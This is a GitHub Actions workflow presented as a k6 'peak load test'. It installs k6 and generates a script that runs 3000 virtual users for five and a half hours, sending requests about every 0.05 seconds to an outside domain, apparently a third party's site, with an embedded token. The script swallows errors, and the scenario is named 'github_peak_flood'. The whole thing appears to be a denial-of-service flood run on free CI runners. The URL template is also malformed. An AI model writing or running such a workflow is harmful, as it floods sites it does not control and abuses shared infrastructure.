name: K6 Peak Load Testing

on:
  workflow_dispatch:

jobs:
  k6_load_test:
    name: Execute k6 Stress Test
    runs-on: ubuntu-latest
    
    env:
      ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION: 'true'

    steps:
    - name: Checkout Code
      uses: actions/checkout@v4

    - name: Setup K6 Performance Testing Tool
      run: |
        sudo mkdir -p /root/.gnupg
        sudo chmod 700 /root/.gnupg
        sudo apt-get update
        sudo apt-get install -y gnupg dirmngr ca-certificates curl tar
        
        # Download k6 trực tiếp từ GitHub releases
        curl -L https://github.com/grafana/k6/releases/download/v0.53.0/k6-v0.53.0-linux-amd64.tar.gz -o k6.tar.gz
        tar xzf k6.tar.gz
        sudo mv k6-v0.53.0-linux-amd64/k6 /usr/local/bin/
        k6 version

    - name: Auto Generate Test Script File
      run: |
        cat << 'EOF' > load_test_run.js
        import http from 'k6/http';
        import { check, sleep } from 'k6';

        export const options = {
          scenarios: {
            github_peak_flood: {
              executor: 'constant-vus',
              vus: 3000,
              duration: '5h30m',
            },
          },
        };

        const TOKEN = '05%2F7JlwSPGyw9zyLckWuhme1c4JqGT6pX1uSy1Ld66Ks0lsEnAmzaCPfHRaGMMhBj60RAomzqNVXQVdkJ%2FvGpaVowpSvKddd%2BBH0saRmaSfpII9yKGTouYzJkIX3r5OeMYWNimHnDfCophfzoCZZd634dab%2FvlFiVoMR3[...]

        export default function () {
          try {
            const res1 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
            check(res1, { 'API OK': (r) => r.status === 200 || r.status === 401 });

            const res2 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
            check(res2, { 'New Hub OK': (r) => r.status !== 0 });

            const res3 = http.get(`https://apiquadautayshelby.vip{TOKEN}`);
            check(res3, { 'Old Hub OK': (r) => r.status !== 0 });
          } catch (err) {
          }
          sleep(0.05); 
        }
        EOF

    - name: Run k6 Performance Test
      run: k6 run load_test_run.js
